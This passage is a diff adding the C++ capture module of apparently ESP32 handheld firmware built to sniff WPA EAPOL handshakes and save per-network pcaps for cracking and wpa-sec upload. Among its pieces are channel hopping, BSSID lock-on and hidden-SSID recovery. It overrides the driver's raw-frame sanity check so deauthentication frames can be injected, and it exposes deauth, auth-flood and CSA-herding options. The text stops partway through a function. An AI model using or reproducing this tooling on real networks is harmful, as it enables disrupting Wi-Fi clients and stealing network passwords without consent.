@@ -1,0 +1,2793 @@
+﻿// cap/sniffer.cpp
+// Promiscuous EAPOL capture -> one classic pcap per BSSID.
+
+#include "sniffer.h"
+#include "pcap.h"
+#include "hc22000.h"
+#include "capture_name.h"
+#include "methods/method_ctx.h"
+#include "../storage/littlefs_ops.h"
+#include "../net/ap_sta.h"
+#include "../core/config.h"
+#include "../core/xp.h"
+#include "../core/wsl_bypasser.h"
+#include "../ui/display.h"
+#include "../ui/keys.h"
+#include "../audio/sfx.h"
+#include <M5Unified.h>
+#include <esp_wifi.h>
+#include <esp_random.h>
+#include <freertos/portmacro.h>  // portENTER_CRITICAL for s_pendingLearn race
+#include <WiFi.h>
+#include <SD.h>
+#include <string.h>
+#include <stdio.h>
+#include <new>
+
+// StickC Plus 2 has no QWERTY keyboard: KEY_ENTER came from Arduino Keyboard.h.
+// No physical Enter key exists; define as ASCII CR so it compiles (isKeyPressed
+// returns false for it, so Enter simply never triggers — correct for this board).
+#ifndef KEY_ENTER
+#define KEY_ENTER 13
+#endif
+
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
+    return 0;
+}
+
+namespace Cap {
+
+static const uint16_t FRAME_MAX = 1100;
+
+// Only EAPOL-Key frames ever reach the capture ring: promiscuousRxCb() runs
+// the `if (!eapol) return;` gate BEFORE the ring write, and beacons go to
+// the separate BeaconSlot table (BEACON_MAX = 400). So the 1100 B slot
+// buffer was never needed for anything but an EAPOL-Key frame.
+//
+// A WPA handshake EAPOL-Key frame is tiny:
+//   24 B 802.11 header (+6 addr4, +2 seq, +4 QoS -> 36 B worst case)
+//    8 B LLC/SNAP
+//    4 B EAPOL header
+//  95 B key descriptor (WPA) .. ~250 B with a full RSN IE
+// -> ~143..300 B on the wire.
+//
+// EAPOL_FRAME_MAX = 512 holds an EAPOL body up to 464 B, i.e. far above
+// anything a real handshake produces, while making a ring slot 536 B
+// instead of 1124 B and a pending slot ~2.2 KB instead of ~4.5 KB.
+// That is what buys back the RAM needed to raise RING / PENDING.
+static const uint16_t EAPOL_FRAME_MAX = 512;
+// Keep the capture queue bounded so WPA-sec sync still has a large
+// contiguous heap block available after radio capture. The selected size is
+// loaded from RadioConfig before each capture session starts.
+// Minimum PCAP for wpa-sec: GlobalHdr(24) + Beacon(~282) + M1(~171) + M2(~217) в‰€ 694 B
+// Cap at 800 to allow slight variance while rejecting over-sized files.
+// hasPair() closes the file early anyway, so in practice it stays ~700 B.
+static const uint32_t DEFAULT_MAX_FILE_SIZE = 800UL;
+static const uint16_t MAX_FILES = 200;
+static const uint8_t HOP_ALL[]  = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
+static const uint8_t HOP_CORE[] = {1, 6, 11};
+
+struct Slot {
+    uint8_t  bssid[6];
+    uint8_t  station[6];
+    uint16_t len;
+    uint16_t originalLen;  // on-air length before FRAME_MAX clamp (for PCAP origLen)
+    uint32_t ts;
+    int8_t   rssi;
+    uint8_t  channel;
+    uint8_t  frame[EAPOL_FRAME_MAX];
+};
+
+static Slot* s_ring = nullptr;
+static uint8_t s_ringSlots = 12;
+static volatile uint8_t s_write = 0;
+static volatile uint8_t s_read  = 0;
+static uint8_t s_pendingSlots = 4;
+
+struct PendingCapture {
+    bool used;
+    uint8_t bssid[6];
+    uint8_t station[6];
+    bool haveM1;
+    bool haveM2;
+    bool haveM3;
+    bool haveM4;
+    uint8_t m1Replay[8];   // В§A: replay counter from M1 (e[9..16])
+    uint8_t m2Replay[8];   // В§A: replay counter from M2 вЂ” must match m1Replay
+    uint8_t m3Replay[8];   // M3 must be M1 replay counter + 1
+    uint8_t m4Replay[8];   // M4 must match M3 replay counter
+    uint32_t lastSeenMs;
+    Slot m1;
+    Slot m2;
+    Slot m3;
+    Slot m4;
+};
+
+static PendingCapture* s_pending = nullptr;
+
+static File     s_file;
+static uint8_t  s_fileBssid[6];
+static uint8_t  s_lastHsBssid[6];
+static bool     s_fileOpen = false;
+static uint32_t s_fileSize = 0;
+static uint32_t s_maxFileSize = DEFAULT_MAX_FILE_SIZE;
+static char     s_fileName[Storage::FILE_NAME_MAX];
+// One-shot log dedup for the "file is already at MAX_FILE_SIZE" branch
+// in openFileForBssid() вЂ” without this, the Serial would see one
+// "[CAP] full" line per EAPOL frame, drowning out useful output. Reset
+// to all-zero every time we successfully open a fresh file.
+static uint8_t  s_fullLoggedBssid[6] = {};
+static const char* const PREFIX = "/0N3P0rK/handshakes/";
+
+// A beacon captured while a network is still hidden has an empty SSID, so the
+// pcap gets created as HIDDEN_<bssid>.pcap and вЂ” worse вЂ” Hc22000::convertPcap()
+// can never derive a crackable hash from it later (WPA-PSK needs the real
+// ESSID). When the real name shows up on a later beacon/probe response for a
+// BSSID we already have a HIDDEN file for, we rename the file and splice the
+// revealing frame in. The actual SD I/O happens in drainRing() (loop context),
+// never here вЂ” storeBeacon() runs from the WiFi promiscuous callback and must
+// stay allocation/I/O free.
+static uint8_t  s_pendingLearnBssid[6] = {};
+static bool     s_pendingLearn = false;
+// Guards s_pendingLearn / s_pendingLearnBssid: written by storeBeacon()
+// from the WiFi promiscuous callback (IRAM, can preempt the loop task
+// at any moment) and read+cleared by processPendingSsidLearn() in loop().
+// The two fields are a logical pair - reading them across the boundary
+// without a critical section could let the callback overwrite BSSID with
+// a fresh entry right after the loop side reset the flag.
+static portMUX_TYPE s_pendingMux = portMUX_INITIALIZER_UNLOCKED;
+
+static const uint8_t BEACON_SLOTS = 16;
+// BeaconSlot itself now lives in methods/beacon_slot.h (pulled in via
+// method_ctx.h) so the capture methods can read it without depending on
+// sniffer.cpp's internals.
+static BeaconSlot* s_beacons = nullptr;
+static uint8_t s_beaconCount = 0;
+static uint8_t s_beaconClock = 0;
+static portMUX_TYPE s_beaconMux = portMUX_INITIALIZER_UNLOCKED;
+static Methods::BeaconView s_methodBeacons[BEACON_SLOTS] = {};
+static uint32_t s_lastBeaconDecayMs = 0;
+
+static Counters s_cnt = {};
+static volatile bool s_running = false;
+static RunMode  s_mode = RunMode::Off;
+static bool     s_hopEnabled = false;
+static bool     s_deauthEnabled = false;
+static uint8_t  s_channelIdx = 0;
+static uint32_t s_lastHopMs = 0;
+static uint8_t  s_apMac[6] = {};
+static uint8_t  s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+static uint8_t  s_kickSta[6] = {};
+static uint8_t  s_kickBssid[6] = {};
+static bool     s_kickStaOk = false;
+static uint32_t s_lockUntil = 0;
+static bool     s_lockOnHs = true;
+static uint16_t s_lockMs = 8000;
+static uint16_t s_hopMs = 300;
+static int8_t   s_minRssi = -85;
+static uint8_t  s_hopSet = 0;
+static uint8_t  s_hsMethod = 0;
+static uint8_t  s_activeMethod = 0; // 0=OURS 1=PAN
+static uint8_t  s_fallbackSec = 25;
+static uint8_t  s_kickBurst = 2;
+static bool     s_bidirKick = true;
+static bool     s_eapolTx = true;
+static bool     s_pmkidProbe = true;
+static bool     s_csaHerd = false;
+static bool     s_authFlood = false;
+static uint8_t  s_deauthReason = 7;
+static bool     s_fatPcap = false;    // slim radiotap (8B) is enough for wpa-sec
+// Porkchop-style knobs. All start at 0 (= "off / use legacy behavior")
+// so existing installs behave exactly as before until the user opts in
+// from the RADIO menu.
+static uint8_t  s_jitterMs = 0;       // 0..20 random ms between mgmt frames
+static uint8_t  s_cooldownSec = 0;    // 0..30 seconds per-AP cooldown after kick
+static int16_t  s_scoreThr = 0;        // -100..200, PORKCHOP method min score
+static uint16_t s_dwellMinMs = 120;    // 0=OFF, otherwise 50..600 minimum channel dwell
+static uint8_t  s_hsDepth = 0;         // 0=PAIR(M1+M2) 1=+M3 2=FULL(M1-M4)
+static bool     s_dataAct = false;     // count data frames for FOCUS activity
+static bool     s_strictLock = true;   // FOCUS ignores score while lock-on-BSSID
+static uint8_t  s_depthHoldSec = 0;    // extra sec hold after pair when hsDepth>0
+static bool     s_autoSkipCompleted = true;
+// PWR / BURST for injected frames (see RadioConfig::txPowerDb/burstPattern).
+static int8_t   s_txPowerDb = 20;      // injected-frame TX power (dBm)
+static uint8_t  s_burstPattern = 1;    // 0=STRAIGHT 1=RANDOM 2=CLUSTER 3=PULSE
+static uint32_t s_methodStartMs = 0;
+static uint16_t s_pairAtSwitch = 0;
+static bool     s_pinOk = false;
+static uint8_t  s_pinBssid[6] = {};
+static uint8_t  s_pinCh = 6;
+static char     s_pinSsid[33] = {};
+
+// ---- Lock-on-BSSID (Porkchop-style) -----------------------------------
+// When the first EAPOL M1 is seen for a target BSSID we want M2 (or M3/M4)
+// from the same handshake. M2 is sent by the STATION back to the AP, on the
+// same channel the AP is on вЂ” which may not be the channel we're currently
+// hopping through. Standard lock-on-channel (s_lockUntil) blocks hopping but
+// can still hop AWAY if the radio's channel happens to switch. Lock-on-BSSID
+// instead parks us on the target BSSID's known channel until either M2 is
+// seen, hasPair() goes true, or lockMs elapses. Drop-in: s_lockUntil still
+// works, but lock-on-BSSID wins while it's armed.
+static uint8_t  s_lockBssid[6] = {};      // BSSID we are parked on (zeroed when idle)
+static uint8_t  s_lockBssidCh = 0;        // channel that BSSID was last seen on
+static uint32_t s_lockBssidUntil = 0;     // millis() deadline; 0 = not armed
+// When the CURRENT continuous streak of locking onto s_lockBssid began -
+// set once when the streak starts, deliberately NOT refreshed on every
+// repeat EAPOL/M1. Backs the hard cap below.
+static uint32_t s_lockBssidArmedMs = 0;
+
+// Session-only fallback skips; persistent skips are stored separately on SD.
+static const uint8_t SKIP_MAX = 16;
+static uint8_t s_skipList[SKIP_MAX][6];
+static uint8_t s_skipN = 0;
+static bool    s_skipKeyWas = false;
+static const uint8_t STORED_SKIP_MAX = 64;
+static const uint8_t MENU_ENTRY_MAX = STORED_SKIP_MAX + BEACON_SLOTS;
+static const char* const SKIP_TMP_PATH = "/0N3P0rK/radio_skip.tmp";
+static const char* const SKIP_BAK_PATH = "/0N3P0rK/radio_skip.bak";
+struct StoredSkip {
+    uint8_t bssid[6];
+    char ssid[33];
+    bool enabled;
+};
+// Skip tables exist only while a sniffer attack is running. They are not
+// loaded at boot and are released in stop(), so idle heap is not parked on them.
+static StoredSkip s_storedSkips[STORED_SKIP_MAX] = {};
+static uint8_t s_storedSkipCount = 0;
+static bool s_storedSkipsLoaded = false;
+static SkipEntry* s_menuEntries = nullptr;
+static uint16_t s_menuEntryCount = 0;
+static uint16_t s_menuSelected = 0;
+static uint16_t s_menuScroll = 0;
+static bool s_skipMenuOpen = false;
+static bool s_skipMenuQWas = false;
+static bool s_skipMenuKeyWas = false;
+static bool s_skipMenuDownWas = false;
+static bool s_skipMenuEnterWas = false;
+
+static bool isZeroMac(const uint8_t* m);
+
+static void releaseSkipMemory() {
+    // The persistent skip table is static storage: it never consumes heap.
+    // Only the menu's temporary display entries are dynamically allocated.
+    delete[] s_menuEntries;
+    s_menuEntries = nullptr;
+    memset(s_storedSkips, 0, sizeof(s_storedSkips));
+    s_storedSkipCount = 0;
+    s_storedSkipsLoaded = false;
+    s_menuEntryCount = 0;
+    s_menuSelected = 0;
+    s_menuScroll = 0;
+    s_skipMenuOpen = false;
+    s_skipN = 0;
+    memset(s_skipList, 0, sizeof(s_skipList));
+}
+
+static bool ensureSkipMemory() {
+    // No heap is needed for persistent skip checks. The menu buffer is
+    // allocated lazily by openSkipMenu() and released by closeSkipMenu().
+    return true;
+}
+
+static int findStoredSkip(const uint8_t* bssid) {
+    for (uint8_t i = 0; i < s_storedSkipCount; i++) {
+        if (memcmp(s_storedSkips[i].bssid, bssid, 6) == 0) return i;
+    }
+    return -1;
+}
+
+static bool parseMac(const char* text, uint8_t out[6]) {
+    unsigned v[6];
+    if (!text || strlen(text) != 17 ||
+        sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",
+               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
+        return false;
+    for (uint8_t i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
+    return !isZeroMac(out);
+}
+
+static int hexValue(char ch) {
+    if (ch >= '0' && ch <= '9') return ch - '0';
+    if (ch >= 'A' && ch <= 'F') return ch - 'A' + 10;
+    if (ch >= 'a' && ch <= 'f') return ch - 'a' + 10;
+    return -1;
+}
+
+static void loadStoredSkips() {
+    if (!Storage::available()) {
+        s_storedSkipsLoaded = false;
+        return;
+    }
+    s_storedSkipCount = 0;
+    if (!SD.exists(Storage::FILE_RADIO_SKIP) && SD.exists(SKIP_BAK_PATH)) {
+        if (!SD.rename(SKIP_BAK_PATH, Storage::FILE_RADIO_SKIP)) {
+            s_storedSkipsLoaded = false;
+            Serial.println("[CAP] cannot recover persistent radio skip backup");
+            return;
+        }
+    } else if (SD.exists(Storage::FILE_RADIO_SKIP) && SD.exists(SKIP_BAK_PATH)) {
+        if (!SD.remove(SKIP_BAK_PATH))
+            Serial.println("[CAP] stale radio skip backup could not be removed");
+    }
+    if (SD.exists(SKIP_TMP_PATH)) SD.remove(SKIP_TMP_PATH);
+    File file = SD.open(Storage::FILE_RADIO_SKIP, FILE_READ);
+    if (!file) {
+        s_storedSkipsLoaded = !SD.exists(Storage::FILE_RADIO_SKIP);
+        return;
+    }
+    char line[96];
+    bool validFile = true;
+    while (file.available()) {
+        if (s_storedSkipCount >= STORED_SKIP_MAX) {
+            validFile = false;
+            break;
+        }
+        size_t n = file.readBytesUntil('\n', line, sizeof(line) - 1);
+        if (n >= sizeof(line) - 1) {
+            validFile = false;
+            break;
+        }
+        line[n] = '\0';
+        if (n && line[n - 1] == '\r') line[--n] = '\0';
+        if (!n || line[0] == '#') continue;
+        char* first = strchr(line, ',');
+        if (!first) { validFile = false; break; }
+        *first++ = '\0';
+        char* second = strchr(first, ',');
+        if (!second) { validFile = false; break; }
+        *second++ = '\0';
+        uint8_t mac[6];
+        if (!parseMac(line, mac) || (first[0] != '0' && first[0] != '1') ||
+            first[1] != '\0' || (strlen(second) & 1u) || strlen(second) > 64) {
+            validFile = false;
+            break;
+        }
+        for (uint8_t i = 0; i < s_storedSkipCount; i++) {
+            if (memcmp(s_storedSkips[i].bssid, mac, 6) == 0) {
+                validFile = false;
+                break;
+            }
+        }
+        if (!validFile) break;
+        StoredSkip& entry = s_storedSkips[s_storedSkipCount];
+        memset(&entry, 0, sizeof(entry));
+        memcpy(entry.bssid, mac, sizeof(mac));
+        entry.enabled = first[0] == '1';
+        size_t ssidLen = strlen(second) / 2;
+        for (size_t i = 0; i < ssidLen; i++) {
+            int hi = hexValue(second[i * 2]);
+            int lo = hexValue(second[i * 2 + 1]);
+            if (hi < 0 || lo < 0 || (hi == 0 && lo == 0)) {
+                validFile = false;
+                break;
+            }
+            entry.ssid[i] = (char)((hi << 4) | lo);
+        }
+        if (!validFile) break;
+        s_storedSkipCount++;
+    }
+    file.close();
+    s_storedSkipsLoaded = validFile;
+    if (!validFile) {
+        s_storedSkipCount = 0;
+        Serial.println("[CAP] invalid persistent radio skip file; refusing to overwrite");
+    }
+}
+
+static bool saveStoredSkips() {
+    if (!Storage::available() || !Storage::ensureDir(Storage::DIR_ROOT)) return false;
+    if (SD.exists(SKIP_TMP_PATH) && !SD.remove(SKIP_TMP_PATH)) return false;
+    File file = SD.open(SKIP_TMP_PATH, FILE_WRITE);
+    if (!file) return false;
+    bool ok = file.println("#MAC,SKIP,SSID_HEX") > 0;
+    for (uint8_t i = 0; ok && i < s_storedSkipCount; i++) {
+        const StoredSkip& entry = s_storedSkips[i];
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 entry.bssid[0], entry.bssid[1], entry.bssid[2],
+                 entry.bssid[3], entry.bssid[4], entry.bssid[5]);
+        ok = file.print(mac) > 0 && file.print(',') > 0 &&
+             file.print(entry.enabled ? '1' : '0') > 0 && file.print(',') > 0;
+        for (size_t j = 0; ok && entry.ssid[j] && j < 32; j++) {
+            char hex[3];
+            snprintf(hex, sizeof(hex), "%02X", (uint8_t)entry.ssid[j]);
+            ok = file.print(hex) == 2;
+        }
+        if (ok) ok = file.println() > 0;
+    }
+    file.flush();
+    file.close();
+    if (!ok) {
+        SD.remove(SKIP_TMP_PATH);
+        return false;
+    }
+    const bool hadOriginal = SD.exists(Storage::FILE_RADIO_SKIP);
+    if (SD.exists(SKIP_BAK_PATH) && !SD.remove(SKIP_BAK_PATH)) {
+        SD.remove(SKIP_TMP_PATH);
+        return false;
+    }
+    if (hadOriginal && !SD.rename(Storage::FILE_RADIO_SKIP, SKIP_BAK_PATH)) {
+        SD.remove(SKIP_TMP_PATH);
+        return false;
+    }
+    if (!SD.rename(SKIP_TMP_PATH, Storage::FILE_RADIO_SKIP)) {
+        if (hadOriginal) SD.rename(SKIP_BAK_PATH, Storage::FILE_RADIO_SKIP);
+        SD.remove(SKIP_TMP_PATH);
+        return false;
+    }
+    if (hadOriginal) SD.remove(SKIP_BAK_PATH);
+    return true;
+}
+
+static bool setStoredSkip(const uint8_t* bssid, const char* ssid, bool enabled) {
+    if (isZeroMac(bssid) || !Storage::available()) return false;
+    if (!s_storedSkipsLoaded) loadStoredSkips();
+    if (!s_storedSkipsLoaded) return false;
+    int index = findStoredSkip(bssid);
+    bool added = index < 0;
+    if (added) {
+        if (s_storedSkipCount >= STORED_SKIP_MAX) return false;
+        index = s_storedSkipCount++;
+        memset(&s_storedSkips[index], 0, sizeof(s_storedSkips[index]));
+        memcpy(s_storedSkips[index].bssid, bssid, 6);
+    }
+    StoredSkip old = s_storedSkips[index];
+    if (ssid && ssid[0]) {
+        strncpy(s_storedSkips[index].ssid, ssid, sizeof(s_storedSkips[index].ssid) - 1);
+        s_storedSkips[index].ssid[sizeof(s_storedSkips[index].ssid) - 1] = '\0';
+    }
+    s_storedSkips[index].enabled = enabled;
+    if (saveStoredSkips()) return true;
+    if (added) s_storedSkipCount--;
+    else s_storedSkips[index] = old;
+    return false;
+}
+
+static bool isPersistentlySkipped(const uint8_t* bssid) {
+    int index = findStoredSkip(bssid);
+    return index >= 0 && s_storedSkips[index].enabled;
+}
+
+static void appendMenuEntry(const uint8_t* bssid, const char* ssid) {
+    if (!s_menuEntries || isZeroMac(bssid)) return;
+    for (uint16_t i = 0; i < s_menuEntryCount; i++) {
+        if (memcmp(s_menuEntries[i].bssid, bssid, 6) == 0) {
+            if (ssid && ssid[0])
+                strncpy(s_menuEntries[i].ssid, ssid, sizeof(s_menuEntries[i].ssid) - 1);
+            return;
+        }
+    }
+    if (s_menuEntryCount >= MENU_ENTRY_MAX) return;
+    SkipEntry& entry = s_menuEntries[s_menuEntryCount++];
+    memset(&entry, 0, sizeof(entry));
+    memcpy(entry.bssid, bssid, 6);
+    if (ssid) strncpy(entry.ssid, ssid, sizeof(entry.ssid) - 1);
+    int stored = findStoredSkip(bssid);
+    if (stored >= 0) {
+        if (!entry.ssid[0]) strncpy(entry.ssid, s_storedSkips[stored].ssid,
+                                    sizeof(entry.ssid) - 1);
+        entry.enabled = s_storedSkips[stored].enabled;
+    }
+}
+
+static void buildSkipMenu() {
+    s_menuEntryCount = 0;
+    if (!s_menuEntries) return;
+    // Keep saved history out of the picker; only active ignores and APs
+    // tracked by the current capture session belong in this view.
+    for (uint8_t i = 0; i < s_storedSkipCount; i++)
+        if (s_storedSkips[i].enabled)
+            appendMenuEntry(s_storedSkips[i].bssid, s_storedSkips[i].ssid);
+    uint8_t beaconCount;
+    portENTER_CRITICAL(&s_beaconMux);
+    beaconCount = s_beaconCount;
+    portEXIT_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < beaconCount; i++) {
+        BeaconSlot beacon;
+        portENTER_CRITICAL(&s_beaconMux);
+        bool available = i < s_beaconCount;
+        if (available) beacon = s_beacons[i];
+        portEXIT_CRITICAL(&s_beaconMux);
+        if (available) appendMenuEntry(beacon.bssid, beacon.ssid);
+    }
+    const uint16_t visibleRows = 5;
+    if (s_menuSelected >= s_menuEntryCount)
+        s_menuSelected = s_menuEntryCount ? s_menuEntryCount - 1 : 0;
+    if (s_menuScroll > s_menuSelected) s_menuScroll = s_menuSelected;
+    if (s_menuSelected >= s_menuScroll + visibleRows)
+        s_menuScroll = s_menuSelected - visibleRows + 1;
+}
+
+static bool keyEdge(char key, bool& wasPressed) {
+    bool pressed = Keys::isKeyPressed(key);
+    bool edge = pressed && !wasPressed;
+    wasPressed = pressed;
+    return edge;
+}
+
+static bool allocateCaptureMemory() {
+    if (s_ring && s_pending && s_beacons) return true;
+    if (!s_ring) s_ring = new (std::nothrow) Slot[s_ringSlots];
+    if (!s_pending) s_pending = new (std::nothrow) PendingCapture[s_pendingSlots];
+    if (!s_beacons) s_beacons = new (std::nothrow) BeaconSlot[BEACON_SLOTS];
+    if (!s_ring || !s_pending || !s_beacons) {
+        delete[] s_ring;
+        delete[] s_pending;
+        delete[] s_beacons;
+        s_ring = nullptr;
+        s_pending = nullptr;
+        s_beacons = nullptr;
+        return false;
+    }
+    return true;
+}
+
+// True MAC empty check вЂ” first-byte-only was wrong for BSSIDs like 00:11:22:вЂ¦
+static bool isZeroMac(const uint8_t* m) {
+    if (!m) return true;
+    for (uint8_t i = 0; i < 6; i++) {
+        if (m[i] != 0) return false;
+    }
+    return true;
+}
+
+static bool isSessionSkipped(const uint8_t* bssid) {
+    if (isZeroMac(bssid)) return false;
+    if (isPersistentlySkipped(bssid)) return true;
+    for (uint8_t i = 0; i < s_skipN; i++) {
+        if (memcmp(s_skipList[i], bssid, 6) == 0) return true;
+    }
+    return false;
+}
+
+static void clearSkipList() {
+    s_skipN = 0;
+    memset(s_skipList, 0, sizeof(s_skipList));
+}
+
+static bool addSkip(const uint8_t* bssid) {
+    if (isZeroMac(bssid)) return false;
+    if (isSessionSkipped(bssid)) return true;
+    if (s_skipN >= SKIP_MAX) {
+        // Drop oldest so we never lose the newest skip the user just pressed.
+        memmove(s_skipList[0], s_skipList[1], (SKIP_MAX - 1) * 6);
+        s_skipN = SKIP_MAX - 1;
+    }
+    memcpy(s_skipList[s_skipN++], bssid, 6);
+    return true;
+}
+
+static void removeSessionSkip(const uint8_t* bssid) {
+    for (uint8_t i = 0; i < s_skipN; i++) {
+        if (memcmp(s_skipList[i], bssid, 6) != 0) continue;
+        if (i + 1 < s_skipN)
+            memmove(&s_skipList[i], &s_skipList[i + 1],
+                    (size_t)(s_skipN - i - 1) * sizeof(s_skipList[0]));
+        s_skipN--;
+        return;
+    }
+}
+
+// Parse "AA:BB:CC:DD:EE:FF" from counters.currentBssid into out[6].
+static bool parseColonMac(const char* s, uint8_t out[6]) {
+    if (!s || !s[0]) return false;
+    unsigned v[6];
+    if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
+               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
+        return false;
+    for (uint8_t i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
+    return !isZeroMac(out);
+}
+
+// Hard ceiling on how long we'll sit locked on one target. Without this,
+// an AP whose client never completes the handshake (often *because* we're
+// actively deauthing it mid-handshake) just keeps retransmitting M1 every
+// second or two forever - and since every M1 refreshes s_lockUntil AND
+// s_lockBssidUntil, the lock would otherwise never expire on its own,
+// permanently pinning the radio on one BSSID/channel ("stops on one
+// client and doesn't move on"). This forces a release after a few
+// multiples of the user's LOCK MS setting no matter how often M1 repeats.
+static uint32_t lockHardCapMs() {
+    uint32_t cap = (uint32_t)s_lockMs * 4;
+    if (cap < 15000) cap = 15000;
+    if (cap > 60000) cap = 60000;
+    return cap;
+}
+
+static bool lockStreakExpired() {
+    return s_lockBssidArmedMs != 0 && (millis() - s_lockBssidArmedMs) >= lockHardCapMs();
+}
+
+static const uint8_t* hopTable(uint8_t* count) {
+    if (s_hopSet == (uint8_t)HopSet::CORE) {
+        *count = sizeof(HOP_CORE);
+        return HOP_CORE;
+    }
+    *count = sizeof(HOP_ALL);
+    return HOP_ALL;
+}
+
+// RSN IE layout: version(2) group(4) pairCnt(2) pair*4 akmCnt(2) akm*4 caps(2) ...
+// bit6 of caps = MFPC (station/AP supports 802.11w), bit7 = MFPR (required).
+// Either bit set means unauthenticated deauth/disassoc will be dropped by the AP/STA.
+static bool parseRsnMfpc(const uint8_t* ie, uint8_t ielen) {
+    if (ielen < 20) return false;
+    uint16_t off = 2 + 4;
+    if (off + 2 > ielen) return false;
+    uint16_t pairCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    off = (uint16_t)(off + 2 + pairCnt * 4);
+    if (off + 2 > ielen) return false;
+    uint16_t akmCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    off = (uint16_t)(off + 2 + akmCnt * 4);
+    if (off + 2 > ielen) return false;
+    uint16_t caps = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    return (caps & 0x00C0) != 0; // MFPC or MFPR
+}
+
+static bool beaconHasPmf(const uint8_t* f, uint16_t len) {
+    uint16_t off = 24 + 12; // fixed beacon params
+    while (off + 2 <= len) {
+        uint8_t id = f[off];
+        uint8_t l = f[off + 1];
+        if (off + 2 + l > len) break;
+        if (id == 48 && parseRsnMfpc(f + off + 2, l)) return true;
+        off = (uint16_t)(off + 2 + l);
+    }
+    return false;
+}
+
+static bool copyBeacon(const uint8_t* bssid, BeaconSlot& out) {
+    if (!bssid || !s_beacons) return false;
+    bool found = false;
+    portENTER_CRITICAL(&s_beaconMux);
+    for (uint8_t i = 0; i < s_beaconCount; i++) {
+        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
+            out = s_beacons[i];
+            found = true;
+            break;
+        }
+    }
+    portEXIT_CRITICAL(&s_beaconMux);
+    return found;
+}
+
+// Method dispatch reads from Methods::table() (see methods/method_ctx.h).
+// Adding a capture method = dropping a method_*.cpp with one
+// CAP_METHOD_REGISTER() line; this file doesn't need a thing.
+//
+// s_activeMethod is the index into that table; 0 is the default. The AUTO
+// mode rotates through [1..count) after a fallback timeout, see
+// maybeRotateMethod().
+
+static uint8_t s_methodCount = 0;
+
+static const Methods::Entry* methodTable() {
+    return Methods::table(&s_methodCount);
+}
+
+static void setMethodTag() {
+    const Methods::Entry* tbl = methodTable();
+    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
+    const char* n = tbl[idx].name;
+    strncpy(s_cnt.methodTag, n, sizeof(s_cnt.methodTag) - 1);
+    s_cnt.methodTag[sizeof(s_cnt.methodTag) - 1] = '\0';
+}
+
+static void noteClient(const uint8_t* bssid, const uint8_t* sta) {
+    if (!bssid || !sta) return;
+    if (sta[0] & 0x01) return;
+    portENTER_CRITICAL(&s_beaconMux);
+    if (!s_running || !s_beacons) {
+        portEXIT_CRITICAL(&s_beaconMux);
+        return;
+    }
+    BeaconSlot* b = nullptr;
+    for (uint8_t i = 0; i < s_beaconCount; i++) {
+        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
+            b = &s_beacons[i];
+            break;
+        }
+    }
+    if (!b) {
+        portEXIT_CRITICAL(&s_beaconMux);
+        return;
+    }
+    // Linear-scan dedup against the live client count, not the hard cap.
+    // Cheap (20 * memcmp(6B) worst case) and correct even after rollover.
+    uint8_t cap = (uint8_t)(sizeof(b->clients) / sizeof(b->clients[0]));
+    for (uint8_t i = 0; i < b->clientN; i++) {
+        if (memcmp(b->clients[i], sta, 6) == 0) {
+            portEXIT_CRITICAL(&s_beaconMux);
+            return;
+        }
+    }
+    if (b->clientN < cap) {
+        memcpy(b->clients[b->clientN], sta, 6);
+        b->clientN++;
+        portEXIT_CRITICAL(&s_beaconMux);
+        return;
+    }
+    // Pool full - LRU-ish eviction by clock counter so we don't churn the
+    // same four slots forever in a busy room.
+    memcpy(b->clients[s_beaconClock % cap], sta, 6);
+    portEXIT_CRITICAL(&s_beaconMux);
+}
+
+static bool hopLocked() {
+    return s_lockUntil != 0 && millis() < s_lockUntil;
+}
+
+// Returns true while we are parked on a target BSSID's channel waiting for
+// the rest of its 4-way handshake (M2/M3/M4). Callers should treat this as
+// 'do not hop away'.
+static bool bssidLocked() {
+    if (isZeroMac(s_lockBssid) || isSessionSkipped(s_lockBssid) ||
+        s_lockBssidUntil == 0) return false;
+    if (lockStreakExpired()) return false;
+    return millis() < s_lockBssidUntil;
+}
+
+// Arm lock-on-BSSID. Called from the promiscuous callback the first time an
+// EAPOL M1 (or any EAPOL at all) is seen for `bssid`. We remember the
+// BSSID, the channel we saw it on, and a deadline of `lockMs` from now. If
+// we're already armed for the same BSSID, refresh the deadline only вЂ” no
+// spurious channel jumps.
+static void armLockOnBssid(const uint8_t* bssid, uint8_t channel) {
+    if (isZeroMac(bssid)) return;
+    if (isSessionSkipped(bssid)) return;
+    if (s_lockOnHs && s_lockMs > 0) {
+        bool same = (memcmp(s_lockBssid, bssid, 6) == 0);
+        if (!same) {
+            memcpy(s_lockBssid, bssid, 6);
+            s_lockBssidArmedMs = millis(); // new streak - starts the hard-cap clock
+        }
+        if (channel >= 1 && channel <= 13) s_lockBssidCh = channel;
+        s_lockBssidUntil = millis() + s_lockMs;
+    }
+}
+
+// Disarm lock-on-BSSID once a complete pair is on file (or after timeout).
+// Clearing the BSSID bytes to zero is what bssidLocked() looks at, so this
+// is the single off-switch.
+static void disarmLockOnBssid() {
+    memset(s_lockBssid, 0, 6);
+    s_lockBssidCh = 0;
+    s_lockBssidUntil = 0;
+    s_lockBssidArmedMs = 0;
+}
+
+static void noteNetwork(const uint8_t* bssid, const char* ssid, bool force) {
+    if (!bssid) return;
+    if (s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0) return;
+    // Session skip (Z): stop showing / chasing this BSSID in the bar.
+    if (isSessionSkipped(bssid)) return;
+    // current* tracks the last-seen beacon / activity for scan status and
+    // Z-skip resolution. A pinned target remains separately in target*.
+    char currentBssid[sizeof(s_cnt.currentBssid)];
